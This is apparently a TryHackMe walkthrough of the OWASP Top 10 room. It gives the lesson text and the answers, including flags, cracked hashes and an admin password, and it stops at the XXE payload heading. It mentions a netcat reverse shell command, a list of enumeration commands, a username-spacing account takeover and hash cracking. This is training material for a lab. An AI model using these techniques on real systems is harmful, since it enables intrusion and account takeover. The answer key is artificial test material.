# TryHackMe walkthrough

## OWASP Top 10

> _tihawk | May 13, 2021_

----------------------------------------

### TASK 1. Introduction

<p style="margin-top:0pt;margin-bottom:0pt;color:;text-align:center;line-height:1.38"><img src="https://i.imgur.com/QYg97jR.png" style="max-width:100%;width:338.25px;height:120.853px;opacity:0.7" /><br /><br /></p><p style="margin-top:0pt;margin-bottom:0pt;text-align:center;line-height:1.38"><span style="text-align:left"><span style="font-size:1rem">This room breaks each OWASP topic down and includes details on what the </span>vulnerability<span style="font-size:1rem"> is, how it occurs and how you can exploit it. You will put the theory into practise by completing supporting challenges.</span></span><br /></p><p style="margin-top:0pt;margin-bottom:0pt;line-height:1.38"><br /></p><ul><li style="margin-top:0pt;margin-bottom:0pt;line-height:1.38">Injection</li><li style="margin-top:0pt;margin-bottom:0pt;line-height:1.38">Broken Authentication</li><li style="margin-top:0pt;margin-bottom:0pt;line-height:1.38">Sensitive Data Exposure</li><li style="margin-top:0pt;margin-bottom:0pt;line-height:1.38">XML External Entity</li><li style="margin-top:0pt;margin-bottom:0pt;line-height:1.38">Broken Access Control</li><li style="margin-top:0pt;margin-bottom:0pt;line-height:1.38">Security Misconfiguration</li><li style="margin-top:0pt;margin-bottom:0pt;line-height:1.38">Cross-site Scripting</li><li style="margin-top:0pt;margin-bottom:0pt;line-height:1.38"><b>I</b>nsecure Deserialization</li><li style="margin-top:0pt;margin-bottom:0pt;line-height:1.38">Components with Known Vulnerabilities</li><li style="margin-top:0pt;margin-bottom:0pt;line-height:1.38">Insufficent Logging &amp; Monitoring</li></ul><p style="margin-top:0pt;margin-bottom:0pt;text-align:center;line-height:1.38"></p><p style="margin-top:0pt;margin-bottom:0pt;line-height:1.38">The room has been designed for beginners and assume no previous knowledge of security.</p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Read the above.

```
OK
```

----------------------------------------

### TASK 2. Accessing machines

<p style="color:;text-align:center"><img src="https://assets.tryhackme.com/img/illustrations/tryhackme_connect.png" style="width:273.5px;height:199.766px" /><br /><br /></p><p style="color:;text-align:center"><span style="font-size:18px">Some tasks will have you learning by doing, often through hacking a virtual machine.<br /></span><br />However, to access these machines you need to either:<span style="font-size:18px"><br /></span></p><table class="table mb-0" style="width:1023px;border:0px"><tbody><tr><td style="border:0px"><div style=""><span style="font-weight:bolder;font-size:18px">Connect using OpenVPN</span></div><div style="">Follow the guide <a href="https://tryhackme.com/connect?o=vpn" target="_blank">here</a> to connect using OpenVPN.</div><div style=""><a href="https://tryhackme.com/connect?o=vpn" target="_blank"><img src="https://tryhackme.com/img/connect/thm_use_openvpn.png" style="max-width:100%;height:auto;width:322px" /></a><br /></div></td><td style="border:0px"><div style=""><span style="font-size:18px">﻿</span><span style="font-weight:bolder;font-size:18px">Use an in-browser Linux Machine</span></div><div style="">If you're <a href="https://tryhackme.com/profile#subscribe" target="_blank">subscribed</a>, deploy the <a href="https://tryhackme.com/my-machine" target="_blank">in-browser</a> AttackBox!</div><div style=""><a href="https://tryhackme.com/my-machine" target="_blank"><img src="https://tryhackme.com/img/connect/thm_use_kali.png" style="max-width:100%;height:auto;width:527px" /></a></div></td></tr></tbody></table>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. <div>Connect to our network or deploy the AttackBox.</div>

```
OK
```

----------------------------------------

### TASK 3. [Severity 1] Injection 

<div>Injection flaws are very common in applications today. These flaws occur because user controlled input is interpreted as actual commands or parameters by the application. Injection attacks depend on what technologies are being used and how exactly the input is interpreted by these technologies. Some common examples include:</div><ul><li>SQL Injection: This occurs when user controlled input is passed to SQL queries. As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries. </li><li>Command Injection: This occurs when user input is passed to system commands. As a result, an attacker is able to execute arbitrary system commands on application servers.</li></ul><div><br /></div><div>If an attacker is able to successfully pass input that is interpreted correctly, they would be able to do the following:</div><ul><li>Access, Modify and Delete information in a database when this input is passed into database queries. This would mean that an attacker can steal sensitive information such as personal details and credentials.</li><li>Execute Arbitrary system commands on a server that would allow an attacker to gain access to users’ systems. This would enable them to steal sensitive data and carry out more attacks against infrastructure linked to the server on which the command is executed.</li></ul><div><br /></div><div>The main defence for preventing injection attacks is ensuring that user controlled input is not interpreted as queries or commands. There are different ways of doing this:</div><ul><li>Using an allow list: when input is sent to the server, this input is compared to a list of safe input or characters. If the input is marked as safe, then it is processed. Otherwise, it is rejected and the application throws an error.</li><li>Stripping input: If the input contains dangerous characters, these characters are removed before they are processed.</li></ul><div><br /></div><div>Dangerous characters or input is classified as any input that can change how the underlying data is processed. Instead of manually constructing allow lists or even just stripping input, there are various libraries that perform these actions for you.</div>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. I've understood Injection attacks.<br />

```
OK
```

----------------------------------------

### TASK 4. [Severity 1] OS Command Injection

<p style="color:;line-height:1.2"><span style="font-size:1rem;font-family:Ubuntu">Command Injection occurs when server-side code (like PHP) in a web application makes a system call on the hosting machine.  It is a web vulnerability that allows an attacker to take advantage of that made system call to execute operating system commands on the server.  Sometimes this won't always end in something malicious, like a </span><code style="font-size:14px;color:;background-color:"><span style="font-family:Ubuntu">whoami</span></code><span style="font-size:1rem;font-family:Ubuntu"> or just reading of files.  That isn't too bad.  But the thing about command injection is it opens up many options for the attacker.  The worst thing they could do would be to spawn a reverse shell to become the user that the web server is running as.  A simple </span><code style="font-size:14px;color:;background-color:"><span style="font-family:Ubuntu">;nc -e /bin/bash</span></code><span style="font-size:1rem;font-family:&quot;ubuntu mono&quot;"><span style="font-family:Ubuntu"> is all that's needed and they own your server; </span><span style="font-weight:bolder">some variants of netcat don't support the -e option. </span><span style="font-family:Ubuntu">You can use a list of </span><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank">these</a><span style="font-family:Ubuntu"> reverse shells as an alternative.</span><span style="font-weight:bolder;font-family:Ubuntu"> </span></span><br /></p><p style="margin-bottom:1rem;color:;line-height:1.2"><span style="font-family:Ubuntu">Once the attacker has a foothold on the web server, they can start the usual enumeration of your systems and start looking for ways to pivot around.  Now that we know what command injection is, we'll start going into the different types and how to test for them.</span></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. I've understood command injection.

```
OK
```

----------------------------------------

### TASK 5. [Severity 1] Command Injection Practical

<p style="margin-top:0in;color:;line-height:1.2"><span style="font-weight:bolder"><span style="font-family:Ubuntu">What is Active Command Injection?</span></span><span style="font-family:&quot;Courier New&quot;"></span></p><p style="margin-top:0in;color:;line-height:1.2">Blind command injection occurs when the system command made to the server does not return the response to the user in the HTML document.  Active command injection will return the response to the user.  It can be made visible through several HTML elements. </p><p style="margin-top:0in;color:;line-height:1.2">Let's consider a scenario: EvilCorp has started development on a web based shell but has accidentally left it exposed to the Internet.  It's nowhere near finished but contains the same command injection vulnerability as before!  But this time, the response from the system call can be seen on the page!  They'll never learn!</p><p style="margin-top:0in;color:;line-height:1.2">Just like before, let's look at the sample code from evilshell.php and go over what it's doing and why it makes it active command injection.  See if you can figure it out.  I'll go over it below just as before.</p><p style="margin-top:0in;color:;line-height:1.2"><span style="font-weight:bolder"><span style="font-family:Ubuntu">EvilShell (evilshell.php) Code Example</span></span></p><p style="margin-top:0in;color:;line-height:1.2"><img src="https://i.imgur.com/KcGizdo.png" style="max-width:100%;height:auto;width:369px" /><br /></p><p style="margin-top:0in;color:;line-height:1.2"><span style="font-family:Ubuntu">In pseudocode, the above snippet is doing the following:</span></p><p style="margin-top:0in;color:;line-height:1.2;margin-left:25px"><span style="font-family:Ubuntu">1. Checking if the parameter "commandString" is set</span></p><p style="margin-top:0in;color:;line-height:1.2;margin-left:25px"><span style="font-family:Ubuntu">2. If it is, then the variable </span><code style="font-size:14px;color:;background-color:"><span style="font-size:10.5pt;background-image:initial;background-position:initial;background-size:initial;background-repeat:initial;background-attachment:initial;background-origin:initial;background-clip:initial;font-family:Ubuntu">$command_string</span></code><span style="font-family:Ubuntu"> gets what was passed into the input field</span></p><p style="margin-top:0in;color:;line-height:1.2;margin-left:25px"><span style="font-family:Ubuntu">3. The program then goes into a try block to execute the function </span><code style="font-size:14px;color:;background-color:"><span style="font-size:10.5pt;background-image:initial;background-position:initial;background-size:initial;background-repeat:initial;background-attachment:initial;background-origin:initial;background-clip:initial;font-family:Ubuntu">passthru($command_string)</span></code><span style="font-family:Ubuntu">.  You can read the docs on </span><code style="font-size:14px;color:;background-color:"><span style="font-size:10.5pt;background-image:initial;background-position:initial;background-size:initial;background-repeat:initial;background-attachment:initial;background-origin:initial;background-clip:initial;font-family:Ubuntu">passthru()</span></code><span style="font-family:Ubuntu"> on </span><a href="https://www.php.net/manual/en/function.passthru.php" target="_blank"><span style="font-family:Ubuntu">PHP's website</span></a><span style="font-family:Ubuntu">, but in general, it is executing what gets entered into the input then passing the output directly back to the browser</span><span style="font-family:Ubuntu">.</span></p><p style="margin-top:0in;color:;line-height:1.2;margin-left:25px"><span style="font-family:Ubuntu">4. If the try does not succeed, output the error to page.  Generally this won't output anything because you can't output stderr but PHP doesn't let you have a try without a catch.</span></p><p style="margin-top:0in;color:;line-height:1.2"><span style="font-size:1rem"><span style="font-weight:bolder"><span style="font-size:13.5pt;font-family:&quot;ubuntu mono&quot;">Ways to Detect Active Command Injection</span></span></span><span style="font-family:&quot;Courier New&quot;"></span></p><p align="left" style="color:;line-height:1.2">We know that active command injection occurs when you can see the response from the system call.  In the above code, the function <code style="font-size:14px;color:;background-color:">passthru()</code> is actually what's doing all of the work here.  It's passing the response directly to the document so you can see the fruits of your labor right there.  Since we know that, we can go over some useful commands to try to enumerate the machine a bit further.  The function call here to <code style="font-size:14px;color:;background-color:">passthru()</code> may not always be what's happening behind the scenes, but I felt it was the easiest and least complicated way to demonstrate the vulnerability.  <br /></p><p align="left" style="color:;line-height:1.2"><span style="font-weight:bolder"><span style="font-size:12pt;font-family:Ubuntu">Commands to try</span></span><span style="font-size:12pt;font-family:&quot;Courier New&quot;"></span></p><p align="left" style="color:;line-height:1.2"><span style="font-weight:bolder"><span style="font-size:12pt;font-family:Ubuntu">Linux</span></span><span style="font-size:12pt;font-family:&quot;Courier New&quot;"></span></p><ul><span style="font-family:&quot;ubuntu mono&quot;"></span><li style="text-align:left;line-height:1.2"><span style="font-size:12pt;font-family:&quot;Courier New&quot;"><span style="font-family:Ubuntu">whoami</span></span></li><span style="font-family:&quot;ubuntu mono&quot;"></span><li style="text-align:left;line-height:1.2"><span style="font-size:12pt;font-family:&quot;Courier New&quot;"><span style="font-family:Ubuntu">id</span></span></li><span style="font-family:&quot;ubuntu mono&quot;"></span><li style="text-align:left;line-height:1.2"><span style="font-size:12pt;font-family:&quot;Courier New&quot;"><span style="font-family:Ubuntu">ifconfig/ip addr</span></span></li><span style="font-family:&quot;ubuntu mono&quot;"></span><li style="text-align:left;line-height:1.2"><span style="font-size:12pt;font-family:&quot;Courier New&quot;"><span style="font-family:Ubuntu">uname -a</span></span></li><span style="font-family:&quot;ubuntu mono&quot;"></span><li style="text-align:left;line-height:1.2"><span style="font-size:12pt;font-family:&quot;Courier New&quot;"><span style="font-family:Ubuntu">ps -ef</span></span></li><span style="font-family:&quot;ubuntu mono&quot;"></span></ul><p align="left" style="color:;line-height:1.2"><span style="font-weight:bolder"><span style="font-size:12pt;font-family:&quot;ubuntu mono&quot;"><span style="font-family:Ubuntu">Windo</span><span style="font-family:Ubuntu">ws</span></span></span><span style="font-size:12pt;font-family:&quot;Courier New&quot;"></span></p><p style="margin-top:0in;color:;line-height:1.2"><span style="font-family:&quot;ubuntu mono&quot;"></span></p><ul><span style="font-family:&quot;ubuntu mono&quot;"></span><li style="text-align:left;line-height:1.2"><span style="font-size:12pt;font-family:&quot;Courier New&quot;"><span style="font-family:Ubuntu">whoami</span></span></li><span style="font-family:&quot;ubuntu mono&quot;"></span><li style="text-align:left;line-height:1.2"><span style="font-size:12pt;font-family:&quot;Courier New&quot;"><span style="font-family:Ubuntu">ver</span></span></li><span style="font-family:&quot;ubuntu mono&quot;"></span><li style="text-align:left;line-height:1.2"><span style="font-size:12pt;font-family:&quot;Courier New&quot;"><span style="font-family:Ubuntu">ipconfig</span></span></li><span style="font-family:&quot;ubuntu mono&quot;"></span><li style="text-align:left;line-height:1.2"><span style="font-size:12pt;font-family:&quot;Courier New&quot;"><span style="font-family:Ubuntu">tasklist</span></span></li><span style="font-family:&quot;ubuntu mono&quot;"></span><li style="text-align:left;line-height:1.2"><span style="font-size:12pt;font-family:&quot;Courier New&quot;"><span style="font-family:Ubuntu">netstat -an</span></span></li><span style="font-family:&quot;ubuntu mono&quot;"></span></ul><p style="color:;line-height:1.2"></p><p style="margin:0in 0in 0.0001pt;color:;line-height:1.2"><i><span style="font-family:&quot;ubuntu mono&quot;">To complete the questions below, navigate to </span></i><span style="font-family:&quot;Courier New&quot;"><a href="http://machine_ip/evilshell.php" target="_blank"><span style="font-family:&quot;ubuntu mono&quot;">http://MACHINE_IP/evilshell.php</span></a><i><span style="font-family:&quot;ubuntu mono&quot;">.</span></i></span></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. What strange text file is in the website root directory?

```
drpepper.txt
```

2. <p>How many non-root/non-service/non-daemon users are there?<br /></p>

```
0
```

3. <p>What user is this app running as?<br /></p>

```
www-data
```

4. <p>What is the user's shell set as?<br /></p>

```
/usr/sbin/nologin
```

5. <p>What version of Ubuntu is running?<br /></p>

```
18.04.4
```

6. <p>Print out the MOTD.  What favorite beverage is shown?<br /></p>

```
Dr Pepper
```

----------------------------------------

### TASK 6. [Severity 2] Broken Authentication

<div style="text-align:center"><img src="https://i.imgur.com/49p4BkI.png" style="width:462px;height:127.826px" /><br /><br /></div><div>Authentication and session management constitute core components of modern web applications. Authentication allows users to gain access to web applications by verifying their identities. The most common form of authentication is using a username and password mechanism. A user would enter these credentials, the server would verify them. If they are correct, the server would then provide the users’ browser with a session cookie. A session cookie is needed because web servers use HTTP(S) to communicate which is stateless. Attaching session cookies means that the server will know who is sending what data. The server can then keep track of users' actions. </div><div><br /></div><div>If an attacker is able to find flaws in an authentication mechanism, they would then successfully gain access to other users’ accounts. This would allow the attacker to access sensitive data (depending on the purpose of the application). Some common flaws in authentication mechanisms include:<br /><br /></div><div><ul><li>Brute force attacks: If a web application uses usernames and passwords, an attacker is able to launch brute force attacks that allow them to guess the username and passwords using multiple authentication attempts. </li><li>Use of weak credentials: web applications should set strong password policies. If applications allow users to set passwords such as ‘password1’ or common passwords, then an attacker is able to easily guess them and access user accounts. They can do this without brute forcing and without multiple attempts.</li><li>Weak Session Cookies: Session cookies are how the server keeps track of users. If session cookies contain predictable values, an attacker can set their own session cookies and access users’ accounts. </li></ul><p>There can be various mitigation for broken authentication mechanisms depending on the exact flaw:</p><ul><li>To avoid password guessing attacks, ensure the application enforces a strong password policy. </li><li>To avoid brute force attacks, ensure that the application enforces an automatic lockout after a certain number of attempts. This would prevent an attacker from launching more brute force attacks.</li><li>Implement Multi Factor Authentication - If a user has multiple methods of authentication, for example, using username and passwords and receiving a code on their mobile device, then it would be difficult for an attacker to get access to both credentials to get access to their account.</li></ul></div>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. I've understood broken authentication mechanisms.<br />

```
OK
```

----------------------------------------

### TASK 7. [Severity 2] Broken Authentication Practical

<p style="color:">For this example, we'll be looking at a logic flaw within the authentication mechanism.</p><p style="color:">A lot of times what happens is that developers forgets to sanitize the input(username &amp; password) given by the user in the code of their application, which can make them vulnerable to attacks like SQL injection. However, we are going to focus on a vulnerability that happens because of a developer's mistake but is very easy to exploit i.e re-registration of an existing user.</p><p style="color:">Let's understand this with the help of an example, say there is an existing user with the name <span style="font-weight:bolder">admin</span> and now we want to get access to their account so what we can do is try to re-register that username but with slight modification. We are going to enter " admin"(notice the space in the starting). Now when you enter that in the username field and enter other required information like email id or password and submit that data. It will actually register a new user but that user will have the same right as normal admin. That new user will also be able to see all the content presented under the user <span style="font-weight:bolder">admin</span>.</p><p style="margin-bottom:1rem;color:">To see this in action go to <a href="http://MACHINE_IP:8888" target="_blank">http://MACHINE_IP:</a><span style="font-weight:bolder"><a href="http://MACHINE_IP:8888" target="_blank">8888</a> </span>and try to register a user name <span style="font-weight:bolder">darren</span>, you'll see that user already exists so then try to register a user <span style="font-weight:bolder">" </span>darren<span style="font-weight:bolder">" </span>and you'll see that you are now logged in and will be able to see the content present only in Darren's account which in our case is the flag that you need to retrieve.</p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. What is the flag that you found in darren's account?

```
fe86079416a21a3c99937fea8874b667
```

2. <p>Now try to do the same trick and see if you can login as <span style="font-weight:bolder">arthur.</span><br /></p>

```
OK
```

3. <p>What is the flag that you found in arthur's account?<br /></p>

```
d9ac0f7db4fda460ac3edeb75d75e16e
```

----------------------------------------

### TASK 8. [Severity 3] Sensitive Data Exposure (Introduction)

<p>When a webapp accidentally divulges sensitive data, we refer to it as "Sensitive Data Exposure". This is often data directly linked to customers (e.g. names, dates-of-birth, financial information, etc), but could also be more technical information, such as usernames and passwords. At more complex levels this often involves techniques such as a "Man in The Middle Attack", whereby the attacker would force user connections through a device which they control, then take advantage of weak encryption on any transmitted data to gain access to the intercepted information (if the data is even encrypted in the first place...). Of course, many examples are much simpler, and vulnerabilities can be found in web apps which can be exploited without any advanced networking knowledge. Indeed, in some cases, the sensitive data can be found directly on the webserver itself...<br /></p><p>The web application in this box contains one such vulnerability. Deploy the machine, then read through the supporting material in the following tasks as the box boots up.</p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Read the introduction to Sensitive Data Exposure and deploy the machine.<br />

```
OK
```

----------------------------------------

### TASK 9. [Severity 3] Sensitive Data Exposure (Supporting Material 1)

<p>The most common way to store a large amount of data in a format that is easily accessible from many locations at once is in a database. This is obviously perfect for something like a web application, as there may be many users interacting with the website at any one time. Database engines usually follow the <span style="font-weight:bolder">S</span>tructured <span style="font-weight:bolder">Q</span>uery <span style="font-weight:bolder">L</span>anguage (SQL) syntax; however, alternative formats (such as NoSQL) are rising in popularity.</p><p>In a production environment it is common to see databases set up on dedicated servers, running a database service such as MySQL or MariaDB; however, databases can also be stored as files. These databases are referred to as "flat-file" databases, as they are stored as a single file on the computer. This is much easier than setting up a full database server, and so could potentially be seen in smaller web applications. Accessing a database server is outwith the scope of today's task, so let's focus instead on flat-file databases.</p><p>As mentioned previously, flat-file databases are stored as a file on the disk of a computer. Usually this would not be a problem for a webapp, but what happens if the database is stored underneath the root directory of the website (i.e. one of the files that a user connecting to the website is able to access)? Well, we can download it and query it on our own machine, with full access to everything in the database. Sensitive Data Exposure indeed!</p><p>That is a big hint for the challenge, so let's briefly cover some of the syntax we would use to query a flat-file database.</p><p>The most common (and simplest) format of flat-file database is an <i>sqlite</i> database. These can be interacted with in most programming languages, and have a dedicated client for querying them on the command line. This client is called "<i>sqlite3</i>", and is installed by default on Kali.</p><p>Let's suppose we have successfully managed to download a database:</p><p><img src="https://i.imgur.com/tmRhcRE.png" style="width:603px" /></p><p>We can see that there is an SQlite database in the current folder.</p><p>To access it we use: <code style="font-size:14px">sqlite3 &lt;database-name&gt;</code>:</p><p><img src="https://i.imgur.com/KJHAdI3.png" style="width:405px" /></p><p>From here we can see the tables in the database by using the <code style="font-size:14px">.tables</code> command:</p><p><img src="https://i.imgur.com/kyIWl1q.png" style="width:406px" /></p><p>At this point we can dump all of the data from the table, but we won't necessarily know what each column means unless we look at the table information. First let's use <code style="font-size:14px">PRAGMA table_info(customers);</code> to see the table information, then we'll use <code style="font-size:14px">SELECT * FROM customers;</code> to dump the information from the table:</p><p><img src="https://i.imgur.com/wVvHk7a.png" style="width:561px" /></p><p>We can see from the table information that there are four columns: custID, custName, creditCard and password. You may notice that this matches up with the results. Take the first row:</p><p><code style="font-size:14px">0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99<br /></code> <br /></p><p>We have the custID (0), the custName (Joy Paulson), the creditCard (4916 9012 2231 7905) and a password hash (5f4dcc3b5aa765d61d8327deb882cf99).</p><p>In the next task we'll look at cracking this hash.</p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Read and understand the supporting material on SQLite Databases.

```
OK
```

----------------------------------------

### TASK 10. [Severity 3] Sensitive Data Exposure (Supporting Material 2)

<p>In the previous task we saw how to query an SQLite database for sensitive data. We found a collection of password hashes, one for each user. In this task we will briefly cover how to crack these.</p><p>When it comes to hash cracking, Kali comes pre-installed with various tools -- if you know how to use these then feel free to do so; however, they are outwith the scope of this material.</p><p></p><p>Instead we will be using the online tool: <a href="https://crackstation.net/" target="_blank">Crackstation</a>. This website is extremely good at cracking weak password hashes. For more complicated hashes we would need more sophisticated tools; however, all of the crackable password hashes used in today's challenge are weak MD5 hashes, which Crackstation should handle very nicely indeed.</p><p>When we navigate to the website we are met with the following interface:</p><p><img src="https://i.imgur.com/oioleck.png" style="width:1011px" /></p><p>Let's try pasting in the password hash for Joy Paulson which we found in the previous task (<code style="font-size:14px">5f4dcc3b5aa765d61d8327deb882cf99</code>). We solve the Captcha, then click the "Crack Hashes" button:</p><p><img src="https://i.imgur.com/KwHMGGV.png" style="width:1012px" /></p><p>We see that the hash was successfully broken, and that the user's password was "password" -- how secure!</p><p>It's worth noting that Crackstation works using a massive wordlist. If the password is not in the wordlist then Crackstation will not be able to break the hash.<br /></p><p>The challenge is guided, so if Crackstation fails to break a hash in today's box you can assume that the hash has been specifically designed to not be crackable.</p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Read the supporting material about cracking hashes.

```
OK
```

----------------------------------------

### TASK 11. [Severity 3] Sensitive Data Exposure (Challenge)

<p>It's now time to put what you've learnt into practice!</p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Have a look around the webapp. The developer has left themselves a note indicating that there is sensitive data in a specific directory. <br /><br />What is the name of the mentioned directory?

```
/assets
```

2. <p>Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?<br /></p>

```
webapp.db
```

3. <p>Use the supporting material to access the sensitive data. What is the password hash of the admin user?<br /></p>

```
6eea9b7ef19179a06954edd0f6c05ceb
```

4. <p>Crack the hash.<br />What is the admin's plaintext password?<br /></p>

```
qwertyuiop
```

5. <p>Login as the admin. What is the flag?<br /></p>

```
THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}
```

----------------------------------------

### TASK 12. [Severity 4] XML External Entity

<p></p><div style="text-align:center"><img src="https://www.acunetix.com/wp-content/uploads/2017/07/XXE_600x315.png" style="font-size:1rem;width:411px;height:215.775px" /></div><div style="text-align:center"><span style="font-size:14px">(Credits to acunetix.com for the image)</span></div><p></p><p>An XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data. It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system. They can also cause Denial of Service (DoS) attack or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web application to make requests to other applications. XXE may even enable port scanning and lead to remote code execution.<br /><br />There are two types of XXE attacks: in-band and out-of-band (OOB-XXE).<br />1) An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.</p><p>2) out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.</p><p><i>This challenge is from our subscriber only material - happy hacking!</i><br /></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Deploy the machine attached to the task.<br />

```
OK
```

----------------------------------------

### TASK 13. [Severity 4 XML External Entity - eXtensible Markup Language

<p>Before we move on to learn about XXE exploitation we'll have to understand XML properly.<br /><br /><span style="font-weight:bolder;font-size:18px">What is XML?</span><br /><br />XML (eXtensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data. <br /><br /><span style="font-weight:bolder;font-size:18px">Why we use XML?</span><br /><br />1. XML is platform-independent and programming language independent, thus it can be used on any system and supports the technology change when that happens.<br /><br />2. The data stored and transported using XML can be changed at any point in time without affecting the data presentation.<br /><br />3. XML allows validation using DTD and Schema. This validation ensures that the XML document is free from any syntax error.<br /><br />4. XML simplifies data sharing between various systems because of its platform-independent nature. XML data doesn’t require any conversion when transferred between different systems.<br /><br /><span style="font-weight:bolder;font-size:18px">Syntax</span><br /><br />Every XML document mostly starts with what is known as XML Prolog.<br /><br /><code style="font-size:14px">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</code></p><p><br />Above the line is called XML prolog and it specifies the XML version and the encoding used in the XML document. This line is not compulsory to use but it is considered a `good practice` to put that line in all your XML documents.<br /><br />Every XML document must contain a `ROOT` element. For example:<br /></p><p><code style="font-size:14px">&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br />&lt;mail&gt;<br />   &lt;to&gt;falcon&lt;/to&gt;<br />   &lt;from&gt;feast&lt;/from&gt;<br />   &lt;subject&gt;About XXE&lt;/subject&gt;<br />   &lt;text&gt;Teach about XXE&lt;/text&gt;<br />&lt;/mail&gt;</code><br /></p><p><br />In the above example the <code style="font-size:14px">&lt;mail&gt;</code> is the ROOT element of that document and <code style="font-size:14px">&lt;to&gt;</code>, <code style="font-size:14px">&lt;from&gt;</code>, <code style="font-size:14px">&lt;subject&gt;</code>, <code style="font-size:14px">&lt;text&gt;</code> are the children elements. If the XML document doesn't have any root element then it would be considered<code style="font-size:14px">wrong</code> or <code style="font-size:14px">invalid</code> XML doc.<br /><br />Another thing to remember is that XML is a case sensitive language. If a tag starts like <code style="font-size:14px">&lt;to&gt;</code> then it has to end by <code style="font-size:14px">&lt;/to&gt;</code> and not by something like <code style="font-size:14px">&lt;/To&gt;</code>(notice the capitalization of <code style="font-size:14px">T</code>)<br /><br />Like HTML we can use attributes in XML too. The syntax for having attributes is also very similar to HTML. For example:<br /><code style="font-size:14px">&lt;text category = "message"&gt;You need to learn about XXE&lt;/text&gt;<br /></code></p><p>In the above example <code style="font-size:14px">category</code> is the attribute name and <code style="font-size:14px">message</code> is the attribute value.</p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Full form of XML

```
Extensible Markup Language
```

2. <p>Is it compulsory to have XML prolog in XML documents?<br /></p>

```
no
```

3. <p>Can we validate XML documents against a schema?<br /></p>

```
yes
```

4. <p>How can we specify XML version and encoding in XML document?<br /></p>

```
XML prolog
```

----------------------------------------

### TASK 14. [Severity 4] XML External Entity - DTD

<p>Before we move on to start learning about XXE we'll have to understand what is DTD in XML.</p><p>DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document.</p><p>Let us try to understand this with the help of an example. Say we have a file named <code style="font-size:14px">note.dtd</code> with the following content:<br /></p><p><code style="font-size:14px">&lt;!DOCTYPE note [ &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt;</code><br /></p>Now we can use this DTD to validate the information of some XML document and make sure that the XML file conforms to the rules of that DTD.<p>Ex: Below is given an XML document that uses <code style="font-size:14px">note.dtd</code></p><div><span style="color:brown"><span style="color:mediumblue">&lt;</span>?xml<span style="color:red"> version<span style="color:mediumblue">="1.0"</span> encoding<span style="color:mediumblue">="UTF-8"</span>?</span><span style="color:mediumblue">&gt;</span></span><br /><span style="color:brown"><span style="color:mediumblue">&lt;</span>!DOCTYPE<span style="color:red"> note SYSTEM "note.dtd"</span><span style="color:mediumblue">&gt;</span></span><br /><span style="color:brown"><span style="color:mediumblue">&lt;</span>note<span style="color:mediumblue">&gt;</span></span><br />    <span style="color:brown"><span style="color:mediumblue">&lt;</span>to<span style="color:mediumblue">&gt;</span></span>falcon<span style="color:brown"><span style="color:mediumblue">&lt;</span>/to<span style="color:mediumblue">&gt;</span></span><br />    <span style="color:brown"><span style="color:mediumblue">&lt;</span>from<span style="color:mediumblue">&gt;</span></span>feast<span style="color:brown"><span style="color:mediumblue">&lt;</span>/from<span style="color:mediumblue">&gt;</span></span><br />    <span style="color:brown"><span style="color:mediumblue">&lt;</span>heading<span style="color:mediumblue">&gt;</span></span>hacking<span style="color:brown"><span style="color:mediumblue">&lt;</span>/heading<span style="color:mediumblue">&gt;</span></span><br />    <span style="color:brown"><span style="color:mediumblue">&lt;</span>body<span style="color:mediumblue">&gt;</span></span>XXE attack<span style="color:brown"><span style="color:mediumblue">&lt;</span>/body<span style="color:mediumblue">&gt;</span></span><br /><span style="color:brown"><span style="color:mediumblue">&lt;</span>/note<span style="color:mediumblue">&gt;</span></span></div><p><br /></p><p>So now let's understand how that DTD validates the XML. Here's what all those terms used in <code style="font-size:14px">note.dtd</code> mean<br /></p><p></p><ul><li>!DOCTYPE note -  Defines a root element of the document named <span style="font-weight:bolder">note</span></li><li>!ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"</li><li>!ELEMENT to - Defines the <code style="font-size:14px">to</code> element to be of type "#PCDATA"</li><li>!ELEMENT from - Defines the <code style="font-size:14px">from</code> element to be of type "#PCDATA"</li><li>!ELEMENT heading  - Defines the <code style="font-size:14px">heading</code> element to be of type "#PCDATA"</li><li>!ELEMENT body - Defines the body <code style="font-size:14px">element</code> to be of type "#PCDATA"</li></ul><p>    <span style="font-weight:bolder">NOTE</span>: #PCDATA means parseable character data.</p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. How do you define a new ELEMENT?

```
!ELEMENT
```

2. <p>How do you define a ROOT element?<br /></p>

```
!DOCTYPE
```

3. <p>How do you define a new ENTITY?<br /></p>

```
!ENTITY
```

----------------------------------------

### TASK 15. [Severity 4] XML External Entity - XXE Payload

